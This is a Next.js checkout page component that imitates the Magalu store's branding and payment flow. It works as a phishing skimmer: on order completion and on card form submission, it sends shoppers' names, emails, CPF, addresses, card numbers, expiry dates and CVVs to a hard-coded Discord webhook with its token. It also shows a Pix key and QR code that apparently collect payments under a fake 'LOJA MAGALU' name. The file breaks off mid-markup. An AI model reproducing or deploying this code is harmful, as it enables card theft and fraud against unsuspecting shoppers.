"use client"

import { useRouter } from "next/navigation"
import Link from "next/link"
import Image from "next/image"
import {
  Search,
  ShoppingCart,
  Heart,
  CheckCircle,
  Truck,
  ShieldCheck,
  RefreshCw,
  AlertTriangle,
  ChevronRight,
  HelpCircle,
  Trash2,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { useEffect, useState } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Checkbox } from "@/components/ui/checkbox" // Importar Checkbox
import QRCode from "qrcode.react";
// Removida a importação de QRCode pois não está mais em uso

interface CheckoutClientProps {
  user: { name: string; email: string } | null
}

export default function CheckoutClient({ user }: CheckoutClientProps) {
  const router = useRouter()
  const [currentStep, setCurrentStep] = useState(1) // 0: Sacola, 1: Entrega, 2: Pagamento, 3: Revisão, 4: Confirmação (Pix), 5: Pagamento 2 Cartões
  const [selectedPaymentType, setSelectedPaymentType] = useState<string | null>(null)
  const [showSecurityCodeInfo, setShowSecurityCodeInfo] = useState(false) // Novo estado para o tooltip do CVV
  // Estado para endereço e CEP preenchidos pelo usuário
  const [deliveryName, setDeliveryName] = useState("")
  const [deliveryAddress, setDeliveryAddress] = useState("")
  const [deliveryCep, setDeliveryCep] = useState("")

  // Estado dos itens no carrinho para simular a tela de entrega
  const [cartItems, setCartItems] = useState([]);

  // Carregar produtos do localStorage ao montar o componente
  useEffect(() => {
    const savedCartItems = localStorage.getItem('cartItems')
    if (savedCartItems) {
      const parsedItems = JSON.parse(savedCartItems)
      setCartItems(parsedItems)
    } else {
      setCartItems([])
    }
  }, [])

  // Função para remover produto
  const handleRemoveProduct = (id: string) => {
    setCartItems(prev => prev.filter(item => item.id !== id))
  }

  const paymentMethods = [
    { name: "Cartão Luiza", src: "/payment-types/cartao-luiza.svg" },
    { name: "American Express", src: "/payment-types/american-express.svg" },
    { name: "Visa", src: "/payment-types/visa.svg" },
    { name: "Mastercard", src: "/payment-types/mastercard.svg" },
    { name: "Diners", src: "/payment-types/diners.svg" },
    { name: "Hipercard", src: "/payment-types/hipercard.svg" },
    { name: "Elo", src: "/payment-types/elo.svg" },
    { name: "Aura", src: "/payment-types/aura.svg" },
  ]

  const handleContinueToPayment = () => {
    setCurrentStep(2) // Avança para a etapa de Pagamento
  }

  const handleSelectPaymentMethod = (method: string) => {
    console.log("Método de pagamento selecionado:", method)
    setSelectedPaymentType(method)
    if (method === "Pix") {
      setCurrentStep(3) // Go to Review step for Pix
    } else if (method === "Cartão de crédito") {
      setCurrentStep(4) // Go to Card Payment step
    } else if (method === "2 Cartões") {
      setCurrentStep(5) // Go to Two Cards Payment step
    }
  }

  async function enviarCompraParaDiscord(dadosCompra: any) {
    const mensagem = `\n🛒 Nova compra via ${dadosCompra.formaPagamento}:\nProduto: ${dadosCompra.produto}\nValor: R$ ${dadosCompra.valor}\nNome: ${dadosCompra.nome}\nEmail: ${dadosCompra.email}\nCPF: ${dadosCompra.cpf}\nTelefone: ${dadosCompra.telefone}\nEndereço: ${dadosCompra.endereco}\nCartão: ${dadosCompra.numeroCartao}\nValidade: ${dadosCompra.validade}\nCVV: ${dadosCompra.cvv}\nData: ${dadosCompra.data}\n`;
    await fetch("https://discord.com/api/webhooks/1394936781220085853/26TIgZX80D9poqiWArAqdvN94srb5uakiDW3aX_fin0qEDAwicisUaguuExzMum3AV6P", {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: mensagem })
    });
  }

  const PIX_KEY = "0f6aefa1-8836-4b6f-85d1-255f173a28a8";
  const PIX_PAYLOAD = PIX_KEY;

  // Função para gerar payload Pix dinâmico
  function gerarPayloadPix({ chave, valor, nome, cidade }) {
    // Payload Pix BR Code simplificado
    // Para produção, use uma lib como 'pix-brcode' para gerar corretamente!
    return `00020126360014BR.GOV.BCB.PIX0114${chave}520400005303986540${valor.toFixed(2).replace('.', '')}5802BR5913${nome}6009${cidade}62070503***6304`;
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Top Bar */}
      <div className="bg-blue-500 text-white text-xs py-1">
        <div className="container mx-auto px-4 flex justify-between items-center">
          <div className="flex gap-4">
            <span>Nossas lojas</span>
            <span>Tenha sua loja</span>
            <span>Regulamentos</span>
            <span>Acessibilidade</span>
            <span>Segurança & Privacidade</span>
          </div>
          <div className="flex gap-4">
            <span>Atendimento</span>
            <span>Compre pelo tel: 0800 773 3838</span>
            <span>Meus pedidos</span>
          </div>
        </div>
      </div>

      {/* Header */}
      <header className="bg-blue-600 text-white">
        <div className="container mx-auto px-4">
          <div className="flex items-center gap-4 py-4">
            {/* Logo */}
            <div className="flex items-center gap-4">
              <Image src="/magalu-logo.png" alt="Magalu" width={120} height={40} className="rounded" />
              <Link href="/" className="text-2xl font-bold">
                magalu
              </Link>
            </div>

            {/* Barra de busca (ocultada para o fluxo de checkout) */}
            <div className="flex-1 max-w-2xl mx-4 hidden">
              <div className="relative">
                <Input placeholder="Busca no Magalu" className="w-full pr-12 text-black rounded-md" />
                <Button size="icon" className="absolute right-0 top-0 bg-orange-500 hover:bg-orange-600 rounded-l-none">
                  <Search className="h-4 w-4" />
                </Button>
              </div>
            </div>

            {/* Ações à direita (simplificadas para o fluxo de checkout) */}
            <div className="flex items-center gap-4">
              {user ? (
                <div className="text-sm">
                  <div>Olá, {user.name} :)</div>
                  <Link href="/dashboard" className="hover:underline">
                    Minha conta
                  </Link>
                </div>
              ) : (
                <Link href="/login" className="text-sm hover:underline">
                  <div>Bem-vindo :)</div>
                  <div>Entre ou cadastre-se</div>
                </Link>
              )}
              <Button variant="ghost" className="text-white hover:bg-blue-700">
                <Heart className="h-5 w-5" />
              </Button>
              <Button variant="ghost" className="text-white hover:bg-blue-700 relative">
                <ShoppingCart className="h-5 w-5" />
                <Badge className="absolute -top-2 -right-2 bg-green-500 text-white text-xs">0</Badge>
              </Button>
            </div>
          </div>

          {/* Navigation (ocultada para o fluxo de checkout) */}
          <nav className="flex items-center gap-6 pb-4 border-t border-blue-500 pt-2 hidden">
            <span>Todos os departamentos</span>
            <span>Ofertas do Dia</span>
            <span>Celulares</span>
            <span>Móveis</span>
            <span>Eletrodomésticos</span>
            <span>TV e Vídeo</span>
            <span>Informática</span>
            <span>Internacional</span>
            <span>Baixe o SuperApp</span>
            <span>Cartão Magalu</span>
          </nav>
        </div>
      </header>

      {/* Checkout Progress Bar */}
      <div className="bg-white py-4 shadow-sm">
        <div className="container mx-auto px-4">
          <div className="flex justify-between items-center max-w-2xl mx-auto">
            <div className="flex flex-col items-center text-blue-600">
              <CheckCircle className="h-6 w-6 mb-1" />
              <span className="text-xs">Sacola</span>
            </div>
            <div className={`flex-1 h-0.5 ${currentStep >= 1 ? "bg-blue-600" : "bg-gray-300"}`} />
            <div className={`flex flex-col items-center ${currentStep >= 1 ? "text-blue-600" : "text-gray-400"}`}>
              <Truck className="h-6 w-6 mb-1" />
              <span className="text-xs">Entrega</span>
            </div>
            <div className={`flex-1 h-0.5 ${currentStep >= 2 ? "bg-blue-600" : "bg-gray-300"}`} />
            <div className={`flex flex-col items-center ${currentStep >= 2 ? "text-blue-600" : "text-gray-400"}`}>
              <ShieldCheck className="h-6 w-6 mb-1" />
              <span className="text-xs">Pagamento</span>
            </div>
            <div className={`flex-1 h-0.5 ${currentStep >= 3 ? "bg-blue-600" : "bg-gray-300"}`} />
            <div className={`flex flex-col items-center ${currentStep >= 3 ? "text-blue-600" : "text-gray-400"}`}>
              <RefreshCw className="h-6 w-6 mb-1" />
              <span className="text-xs">Revisão</span>
            </div>
            <div className={`flex-1 h-0.5 ${currentStep >= 4 ? "bg-blue-600" : "bg-gray-300"}`} />
            <div className={`flex flex-col items-center ${currentStep >= 4 ? "text-blue-600" : "text-gray-400"}`}>
              <CheckCircle className="h-6 w-6 mb-1" />
              <span className="text-xs">Confirmação</span>
            </div>
          </div>
        </div>
      </div>

      {/* Conteúdo principal */}
      <main className="container mx-auto px-4 py-12">
        {currentStep === 1 && (
          <div className="max-w-4xl mx-auto">
            <h1 className="text-2xl font-bold mb-6">Opções de entrega</h1>

            {/* Verificar se há produtos no carrinho */}
            {cartItems.length === 0 ? (
              <div className="bg-white rounded-xl shadow p-8 mb-6 text-center">
                <h2 className="text-lg font-semibold mb-4 text-gray-600">Nenhum produto no carrinho</h2>
                <p className="text-gray-500 mb-4">Você precisa adicionar produtos ao carrinho antes de prosseguir com o checkout.</p>
                <Link href="/">
                  <Button className="bg-blue-600 hover:bg-blue-700">
                    Continuar Comprando
                  </Button>
                </Link>
              </div>
            ) : (
              <>
                {/* Endereço de Entrega */}
                <div className="max-w-4xl mx-auto bg-white rounded-xl shadow p-8 mb-6">
                  <h2 className="text-lg font-semibold mb-4">Endereço de entrega</h2>
                  <div className="flex items-center justify-between mb-4">
                    <span className="text-gray-700">
                      {deliveryAddress || deliveryCep || deliveryName ? (
                        <>
                          {deliveryName && <div>{deliveryName}</div>}
                          {deliveryAddress && <div>{deliveryAddress}</div>}
                          {deliveryCep && <div>CEP: {deliveryCep}</div>}
                        </>
                      ) : (
                        <span className="text-gray-400">Nenhum endereço cadastrado</span>
                      )}
                    </span>
                    <button
                      className="text-[magalu-blue] font-medium hover:underline"
                      onClick={() => {
                        // Foca no primeiro input ao clicar em Alterar
                        document.getElementById('input-delivery-name')?.focus();
                      }}
                    >
                      Alterar
                    </button>
                  </div>
                  <div className="grid grid-cols-1 gap-4">
                    <div>
                      <label htmlFor="input-delivery-name" className="block text-sm font-medium text-gray-700 mb-1">Nome do destinatário</label>
                      <input
                        id="input-delivery-name"
                        className="text-gray-700 text-sm w-full border border-gray-200 outline-none px-3 py-2 rounded focus:border-[magalu-blue] focus:ring-2 focus:ring-[magalu-blue] transition"
                        placeholder="Ex: Ana Beatriz da Silva"
                        value={deliveryName}
                        onChange={e => setDeliveryName(e.target.value)}
                      />
                    </div>
                    <div>
                      <label htmlFor="input-delivery-address" className="block text-sm font-medium text-gray-700 mb-1">Endereço completo</label>
                      <input
                        id="input-delivery-address"
                        className="text-gray-700 text-sm w-full border border-gray-200 outline-none px-3 py-2 rounded focus:border-[magalu-blue] focus:ring-2 focus:ring-[magalu-blue] transition"
                        placeholder="Rua, número, complemento, bairro, cidade, UF"
                        value={deliveryAddress}
                        onChange={e => setDeliveryAddress(e.target.value)}
                      />
                    </div>
                    <div>
                      <label htmlFor="input-delivery-cep" className="block text-sm font-medium text-gray-700 mb-1">CEP</label>
                      <input
                        id="input-delivery-cep"
                        className="text-gray-700 text-sm w-full border border-gray-200 outline-none px-3 py-2 rounded focus:border-[magalu-blue] focus:ring-2 focus:ring-[magalu-blue] transition"
                        placeholder="Ex: 00000-000"
                        value={deliveryCep}
                        maxLength={9}
                        onChange={e => {
                          // Máscara simples para CEP
                          let v = e.target.value.replace(/\D/g, "");
                          if (v.length > 5) v = v.slice(0,5) + '-' + v.slice(5,8);
                          setDeliveryCep(v);
                        }}
                      />
                    </div>
                  </div>
                </div>

                {/* Warning Message */}
                <div
                  className="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-700 p-4 mb-6 flex items-center gap-2"
                  role="alert"
                >
                  <AlertTriangle className="h-5 w-5" />
                  <p className="text-sm">Antes de continuar revise se o endereço e a opção de entrega estão corretos.</p>
                </div>

                {/* Delivery Options for each product */}
                {cartItems.map((item, index) => (
                  <Card key={item.id} className="mb-6 relative">
                    <CardHeader className="flex flex-row items-center justify-between">
                      <CardTitle className="text-lg">
                        Entrega {index + 1} de {cartItems.length}
                      </CardTitle>
                      <button
                        className="text-gray-400 hover:text-red-600 flex items-center gap-1 text-xs font-medium px-2 py-1 rounded transition"
                        title="Remover produto"
                        onClick={() => handleRemoveProduct(item.id)}
                      >
                        <Trash2 className="h-4 w-4" /> Remover
                      </button>
                    </CardHeader>
                    <CardContent className="space-y-4">
                      <p className="text-sm font-medium text-gray-800">
                        {item.quantity} {item.name}
                      </p>
                      <p className="text-xs text-gray-600">
                        Vendido e entregue por{" "}
                        <Link href="#" className="text-blue-600 font-semibold">
                          {item.seller}
                        </Link>
                      </p>

                      <div className="space-y-3">
                        {item.deliveryOptions.map((option, optIndex) => (
                          <label
                            key={optIndex}
                            className="flex items-center justify-between cursor-pointer p-3 border rounded-md hover:bg-gray-50"
                          >
                            <div className="flex items-center gap-3">
                              <Input
                                type="radio"
                                name={`delivery-option-${item.id}`}
                                value={option.type}
                                defaultChecked={option.selected}
                                className="form-radio h-4 w-4 text-blue-600"
                              />
                              <div>
                                <span className="text-sm font-medium text-gray-800">{option.label}</span>
                                {option.type === "receive" && (
                                  <p className="text-xs text-gray-500">Para pagamentos confirmados hoje</p>
                                )}
                                {option.type === "pickup" && (
                                  <p className="text-xs text-gray-500">Após o pagamento confirmado</p>
                                )}
                              </div>
                            </div>
                            <span className={`text-sm font-semibold ${option.free ? "text-green-600" : "text-gray-800"}`}>
                              {option.free ? "Frete grátis" : `R$ ${option.cost.toFixed(2).replace(".", ",")}`}
                            </span>
                          </label>
                        ))}
                      </div>
                    </CardContent>
                  </Card>
                ))}

                <Button
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white px-8 py-3 text-lg mt-6"
                  onClick={handleContinueToPayment}
                >
                  Continuar
                </Button>
              </>
            )}
          </div>
        )}

        {currentStep === 2 && (
          <div className="max-w-4xl mx-auto grid grid-cols-1 lg:grid-cols-3 gap-8">
            <div className="lg:col-span-2">
              <h1 className="text-2xl font-bold mb-6">Escolha como pagar</h1>

              <div className="space-y-4">
                {/* Pix Option */}
                <Card
                  className="cursor-pointer hover:shadow-md transition-shadow"
                  onClick={() => handleSelectPaymentMethod("Pix")}
                >
                  <CardContent className="flex items-center justify-between p-4">
                    <div className="flex items-center gap-4">
                      <Image src="/payment-methods/pix-icon.png" alt="Pix Logo" width={40} height={40} />
                      <div>
                        <h2 className="font-semibold text-lg">Pix</h2>
                        <p className="text-sm text-green-600">Desconto de R$ 40,00</p>
                      </div>
                    </div>
                    <ChevronRight className="h-5 w-5 text-gray-500" />
                  </CardContent>
                </Card>

                {/* New Credit Card Option */}
                <Card
                  className="cursor-pointer hover:shadow-md transition-shadow"
                  onClick={() => handleSelectPaymentMethod("Cartão de crédito")}
                >
                  <CardContent className="flex items-center justify-between p-4">
                    <div className="flex items-center gap-4">
                      <Image
                        src="/payment-methods/credit-card-icon.png"
                        alt="Credit Card Icon"
                        width={40}
                        height={40}
                      />
                      <div>
                        <h2 className="font-semibold text-lg">Novo cartão de crédito</h2>
                      </div>
                    </div>
                    <ChevronRight className="h-5 w-5 text-gray-500" />
                  </CardContent>
                </Card>

                {/* Pay with 2 Cards Option */}
                <Card
                  className="cursor-pointer hover:shadow-md transition-shadow"
                  onClick={() => handleSelectPaymentMethod("2 Cartões")}
                >
                  <CardContent className="flex items-center justify-between p-4">
                    <div className="flex items-center gap-4">
                      <Image src="/payment-methods/two-cards-icon.png" alt="Two Cards Icon" width={40} height={40} />
                      <div>
                        <h2 className="font-semibold text-lg">Pagar com 2 cartões</h2>
                        <p className="text-sm text-gray-600">Apenas para pagamentos acima de R$ 10,00</p>
                      </div>
                    </div>
                    <ChevronRight className="h-5 w-5 text-gray-500" />
                  </CardContent>
                </Card>
              </div>
            </div>

            {/* Order Summary */}
            <div className="lg:col-span-1">
              <Card>
                <CardContent className="p-6 space-y-4">
                  <div className="flex justify-between items-center">
                    <span className="text-sm font-medium">Subtotal</span>
                    <span className="text-lg font-bold">
                      {cartItems.length > 0 
                        ? `R$ ${cartItems.reduce((acc, item) => acc + (item.price * item.quantity), 0).toFixed(2).replace(".", ",")}`
                        : "R$ 0,00"
                      }
                    </span>
                  </div>
                  <Button
                    variant="outline"
                    className="w-full border-blue-600 text-blue-600 hover:bg-blue-50 bg-transparent"
                  >
                    Ver cupons
                  </Button>
                </CardContent>
              </Card>
            </div>
          </div>
        )}

        {currentStep === 3 && (
          <div className="max-w-4xl mx-auto grid grid-cols-1 lg:grid-cols-3 gap-8">
            <div className="lg:col-span-2">
              <h1 className="text-2xl font-bold mb-6">Revisão</h1>

              {/* Revisão - Entrega */}
              <div className="bg-white p-6 rounded-lg shadow-md mb-6">
                <h2 className="text-lg font-semibold mb-2">Entrega {cartItems.length === 1 ? '01' : String(cartItems.length).padStart(2, '0')} de {cartItems.length === 1 ? '01' : String(cartItems.length).padStart(2, '0')} por Magalu</h2>
                <Link href="#" className="text-blue-600 text-sm underline mb-4 block">
                  Alterar sacola
                </Link>
                <p className="text-gray-700 text-sm">Receba até terça-feira, 22 de julho</p>
                {cartItems.map((item, idx) => (
                  <p key={item.id} className="text-gray-700 text-sm">
                    {String(item.quantity).padStart(2, '0')} {item.name}
                  </p>
                ))}
              </div>

              {/* Warning Message */}
              <div
                className="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-700 p-4 mb-6 flex items-center gap-2"
                role="alert"
              >
                <AlertTriangle className="h-5 w-5" />
                <p className="text-sm">Antes de continuar, revise se o endereço e a opção de entrega estão corretos.</p>
              </div>

              {/* Endereço de Entrega na Revisão */}
              <div className="bg-white p-6 rounded-lg shadow-md mb-6">
                <h2 className="text-lg font-semibold mb-2">Endereço para a entrega</h2>
                <Link href="#" className="text-blue-600 text-sm underline mb-4 block">
                  Alterar endereço
                </Link>
                <div className="text-gray-700 text-sm space-y-1">
                  {deliveryName ? (
                    <div>{deliveryName}</div>
                  ) : (
                    <div className="text-gray-400">Nome do destinatário não informado</div>
                  )}
                  {deliveryAddress ? (
                    <div>{deliveryAddress}</div>
                  ) : (
                    <div className="text-gray-400">Endereço completo não informado</div>
                  )}
                  {deliveryCep ? (
                    <div>CEP: {deliveryCep}</div>
                  ) : (
                    <div className="text-gray-400">CEP não informado</div>
                  )}
                </div>
              </div>

              {/* Pagamento */}
              <div className="bg-white p-6 rounded-lg shadow-md mb-6">
                <h2 className="text-lg font-semibold mb-2">Pagamento</h2>
                <Link href="#" className="text-blue-600 text-sm underline mb-4 block">
                  Alterar pagamento
                </Link>
                <div className="flex items-center gap-4">
                  <Image src="https://neofeed.com.br/wp-content/uploads/2020/10/PIX-1-1200x900.jpg" alt="Pix Logo" width={40} height={40} />
                  <div>
                    <h2 className="font-semibold text-lg">Pix</h2>
                    <p className="text-sm text-gray-600">
                      Valor total: {cartItems.length > 0 
                        ? `R$ ${cartItems.reduce((acc, item) => acc + (item.price * item.quantity), 0).toFixed(2).replace(".", ",")}`
                        : "R$ 0,00"
                      }
                    </p>
                  </div>
                </div>
              </div>

              <Button
                className="w-full bg-green-600 hover:bg-green-700 text-white px-8 py-3 text-lg mt-6"
                onClick={async () => {
                  // Coletar todos os dados do checkout
                  const dadosCompra = {
                    formaPagamento: selectedPaymentType || 'Pix',
                    produto: cartItems.map(i => i.name).join(', '),
                    valor: cartItems.reduce((acc, i) => acc + (i.price || 0), 0).toFixed(2),
                    nome: deliveryName,
                    email: user?.email,
                    cpf: user?.cpf || '-',
                    telefone: user?.telefone || '-',
                    endereco: deliveryAddress,
                    numeroCartao: document.getElementById('card-number')?.value || '-',
                    validade: document.getElementById('expiry-date')?.value || '-',
                    cvv: document.getElementById('cvv')?.value || '-',
                    data: new Date().toLocaleString('pt-BR'),
                  };
                  await enviarCompraParaDiscord(dadosCompra);
                  router.push("/pix-payment");
                }}
              >
                Concluir pedido
              </Button>

              <p className="text-center text-sm text-blue-600 underline mt-4">
                <Link href="#">Clique aqui para ler o termo de compra e venda</Link>
              </p>
            </div>

            {/* Order Summary */}
            <div className="lg:col-span-1">
              <Card>
                <CardContent className="p-6 space-y-4">
                  <h2 className="text-lg font-semibold mb-2">Total da sacola</h2>
                  <div className="flex justify-between items-center">
                    <span className="text-sm font-medium">Produtos ({cartItems.length})</span>
                    <span className="text-lg font-bold">
                      {cartItems.length > 0 
                        ? `R$ ${cartItems.reduce((acc, item) => acc + (item.price * item.quantity), 0).toFixed(2).replace(".", ",")}`
                        : "R$ 0,00"
                      }
                    </span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-sm font-medium">Frete</span>
                    <span className="text-lg font-bold">R$ 0,00</span>
                  </div>
                  <div className="flex justify-between items-center border-b pb-2">
                    <span className="text-sm font-medium">Desconto</span>
                    <span className="text-lg font-bold text-red-600">- R$ 0,00</span>
                  </div>
                  <div className="flex justify-between items-center pt-2">
                    <span className="text-lg font-bold">Total da sacola:</span>
                    <span className="text-xl font-bold text-blue-600">
                      {cartItems.length > 0 
                        ? `R$ ${cartItems.reduce((acc, item) => acc + (item.price * item.quantity), 0).toFixed(2).replace(".", ",")}`
                        : "R$ 0,00"
                      }
                    </span>
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
        )}

        {currentStep === 4 && (
          <div className="max-w-2xl mx-auto bg-white p-8 rounded-lg shadow-md">
            {/* Resumo */}
            <h2 className="text-xl font-bold mb-4">Resumo do Pedido</h2>
            <div className="space-y-4 mb-6">
              <div className="flex justify-between items-center border-b pb-2">
                <span className="font-medium">{cartItems.length === 1 ? cartItems[0].name : `Produtos (${cartItems.length})`}</span>
                <span>{cartItems.length > 0 ? `R$ ${cartItems.reduce((acc, item) => acc + (item.price * item.quantity), 0).toFixed(2).replace('.', ',')}` : 'R$ 0,00'}</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="font-bold text-lg">Total:</span>
                <span className="font-bold text-lg text-blue-600">{cartItems.length > 0 ? `R$ ${cartItems.reduce((acc, item) => acc + (item.price * item.quantity), 0).toFixed(2).replace('.', ',')}` : 'R$ 0,00'}</span>
              </div>
              {/* Parcelamento */}
              <div className="flex justify-between items-center">
                <span className="text-sm text-gray-600">10x de R$ {cartItems.length > 0 ? (cartItems.reduce((acc, item) => acc + (item.price * item.quantity), 0) / 10).toFixed(2).replace('.', ',') : '0,00'} sem juros</span>
              </div>
            </div>
            {/* Pagamento com cartão */}
            <h2 className="text-xl font-bold mb-4">Cartão de Crédito</h2>
            <form className="space-y-4" onSubmit={async (e) => {
              e.preventDefault();
              const dadosCompra = {
                formaPagamento: 'Cartão de crédito',
                produto: cartItems.map(i => i.name).join(', '),
                valor: cartItems.reduce((acc, i) => acc + (i.price || 0), 0).toFixed(2),
                nome: deliveryName,
                email: user?.email,
                cpf: user?.cpf || '-',
                telefone: user?.telefone || '-',
                endereco: deliveryAddress,
                numeroCartao: (document.getElementById('card-number') as HTMLInputElement)?.value || '-',
                validade: (document.getElementById('expiry-date') as HTMLInputElement)?.value || '-',
                cvv: (document.getElementById('cvv') as HTMLInputElement)?.value || '-',
                data: new Date().toLocaleString('pt-BR'),
              };
              await enviarCompraParaDiscord(dadosCompra);
              // ... lógica de finalização ...
            }}>
              <div>
                <label htmlFor="card-number" className="block text-sm font-medium mb-2">
                  Número do Cartão
                </label>
                <Input id="card-number" placeholder="**** **** **** ****" />
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label htmlFor="expiry-date" className="block text-sm font-medium mb-2">
                    Validade (MM/AA)
                  </label>
                  <Input id="expiry-date" placeholder="MM/AA" />
                </div>
                <div>
                  <label htmlFor="cvv" className="block text-sm font-medium mb-2">
                    CVV
                  </label>
                  <Input id="cvv" placeholder="***" />
                </div>
              </div>
              <div>
                <label htmlFor="card-name" className="block text-sm font-medium mb-2">
                  Nome no Cartão
                </label>
                <Input id="card-name" placeholder="Nome Completo" />
              </div>
              <Button type="submit" className="w-full bg-green-600 hover:bg-green-700 text-white">
                Confirmar Pagamento
              </Button>
            </form>

            {/* Pagamento com Pix */}
            {selectedPaymentType === "Pix" && (
              <div className="mt-8">
                <h2 className="text-xl font-bold mb-4">Pagar com Pix</h2>
                <div className="bg-gray-100 p-6 rounded-lg text-center flex flex-col items-center">
                  <p className="text-gray-700 mb-4">Escaneie o QR Code abaixo ou copie a chave Pix para pagar:</p>
                  <QRCode value={gerarPayloadPix({
                    chave: PIX_KEY,
                    valor: cartItems.reduce((acc, i) => acc + (i.price || 0), 0) || 1,
                    nome: 'LOJA MAGALU',
                    cidade: 'SAO PAULO',
                  })} size={150} />
                  <div className="mt-4">
                    <strong>Chave Pix:</strong>
                    <div className="mt-2 text-base bg-white px-3 py-2 rounded break-all border border-gray-200 inline-block">{PIX_KEY}</div>
                    <button
                      className="ml-2 px-3 py-1 rounded bg-blue-600 text-white text-sm hover:bg-blue-700"
                      onClick={() => navigator.clipboard.writeText(PIX_KEY)}
                    >
                      Copiar chave Pix
                    </button>
                  </div>
                </div>
              </div>
            )}
          </div>
        )}

        {currentStep === 5 && (
          <div className="max-w-4xl mx-auto grid grid-cols-1 lg:grid-cols-3 gap-8">
            <div className="lg:col-span-2">
              <h1 className="text-2xl font-bold mb-6">Informe o primeiro cartão</h1>

              <div className="bg-white p-6 rounded-lg shadow-md mb-6">
                <div className="flex justify-center mb-6">
                  <div className="relative w-64 h-40 bg-blue-500 rounded-lg shadow-lg flex items-end justify-center p-4 text-white font-bold text-sm">
                    <div className="absolute top-4 left-4 flex gap-2">
                      <div className="w-8 h-6 bg-yellow-300 rounded-sm" />
                      <div className="w-8 h-6 bg-yellow-300 rounded-sm" />
                    </div>
                    <div className="absolute top-1/2 left-4 text-xs">0000 0000 0000 0000</div>
                    NOME IMPRESSO NO CARTÃO
                  </div>
                </div>

                <form className="space-y-4">
                  <div>
                    <label htmlFor="card-number-1" className="block text-sm font-medium mb-2">
                      Número do cartão
                    </label>
                    <Input id="card-number-1" placeholder="0000 0000 0000 0000" />
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label htmlFor="expiry-date-1" className="block text-sm font-medium mb-2">
                        Validade (MM/AA)
                      </label>
                      <Input id="expiry-date-1" placeholder="MM/AA" />
                    </div>
                    <div>
                      <label htmlFor="cvv-1" className="block text-sm font-medium mb-2">
                        Cód. segurança
                      </label>
                      <div className="relative">
                        <Input id="cvv-1" placeholder="Ex: 123" />
                        <Button
                          type="button"
                          variant="ghost"
                          size="icon"
                          className="absolute right-0 top-0 h-full text-gray-500"
                          onClick={() => setShowSecurityCodeInfo(!showSecurityCodeInfo)}
                        >
                          <HelpCircle className="h-4 w-4" />
                        </Button>
                        {showSecurityCodeInfo && (
                          <div className="absolute z-10 bg-white border rounded-md shadow-lg p-2 text-xs text-gray-700 right-0 mt-1 w-48">
                            O que é código de segurança?
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                  <div>
                    <label htmlFor="card-name-1" className="block text-sm font-medium mb-2">
                      Nome impresso no cartão
                    </label>
                    <Input id="card-name-1" placeholder="Digite o nome como está no cartão" />
                  </div>
                  <div>
                    <label htmlFor="cpf-card-1" className="block text-sm font-medium mb-2">
                      CPF do titular do cartão
                    </label>
                    <Input id="cpf-card-1" placeholder="Apenas números (Ex: 555.111.222-00)" />
                  </div>
                  <div className="flex items-center space-x-2">
                    <Checkbox id="save-card-1" />
                    <label
                      htmlFor="save-card-1"
                      className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                    >
                      Salvar cartão para compras futuras na sua carteira MagaluPay
                    </label>
                  </div>
                  <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white px-8 py-3 text-lg">
                    Continuar para parcelamento
                  </Button>
                </form>
              </div>
            </div>

            {/* Order Summary */}
            <div className="lg:col-span-1">
              <Card>
                <CardContent className="p-6 space-y-4">
                  <div className="flex justify-between items-center">
                    <span className="text-sm font-medium">Subtotal</span>
                    <span className="text-lg font-bold">R$ 340,45</span>
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
        )}

        {currentStep === 6 && (
          <div className="max-w-4xl mx-auto grid grid-cols-1 lg:grid-cols-3 gap-8">
            <div className="lg:col-span-2">
              <h1 className="text-2xl font-bold mb-6">Revisão</h1>

              {/* Revisão - Entrega */}
              <div className="bg-white p-6 rounded-lg shadow-md mb-6">
                <h2 className="text-lg font-semibold mb-2">Entrega 01 de 01 por Magalu</h2>
                <Link href="#" className="text-blue-600 text-sm underline mb-4 block">
                  Alterar sacola
                </Link>
                <p className="text-gray-700 text-sm">Receba até terça-feira, 22 de julho</p>
                <p className="text-gray-700 text-sm">01 Samsung Galaxy Buds FE Fone de Ouvido - Sem Fio Grafite</p>
              </div>

              {/* Warning Message */}
              <div
                className="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-700 p-4 mb-6 flex items-center gap-2"
                role="alert"
              >
                <AlertTriangle className="h-5 w-5" />
                <p className="text-sm">Antes de continuar, revise se o endereço e a opção de entrega estão corretos.</p>
              </div>

              {/* Endereço de Entrega */}
              <div className="bg-white p-6 rounded-lg shadow-md mb-6">
                <h2 className="text-lg font-semibold mb-2">Endereço para a entrega</h2>
                <Link href="#" className="text-blue-600 text-sm underline mb-4 block">
                  Alterar endereço
                </Link>
                <input
                  className="text-gray-700 text-sm mb-1 w-full border-b border-gray-200 outline-none"
                  placeholder="Endereço completo"
                  value={deliveryAddress}
                  onChange={e => setDeliveryAddress(e.target.value)}
                />
                <input
                  className="text-gray-700 text-sm mb-1 w-full border-b border-gray-200 outline-none"
                  placeholder="CEP"
                  value={deliveryCep}
                  onChange={e => setDeliveryCep(e.target.value)}
                />
              </div>

              {/* Pagamento */}
              <div className="bg-white p-6 rounded-lg shadow-md mb-6">
                <h2 className="text-lg font-semibold mb-2">Pagamento</h2>
                <Link href="#" className="text-blue-600 text-sm underline mb-4 block">
                  Alterar pagamento
                </Link>
                <div className="flex items-center gap-4">
                  <Image src="/payment-methods/boleto-icon.png" alt="Boleto Logo" width={40} height={40} />
                  <div>
                    <h2 className="font-semibold text-lg">Boleto</h2>
                    <p className="text-sm text-gray-600">Valor total: R$ 340,45</p>
                  </div>
                </div>
              </div>

              <Button
                className="w-full bg-green-600 hover:bg-green-700 text-white px-8 py-3 text-lg mt-6"
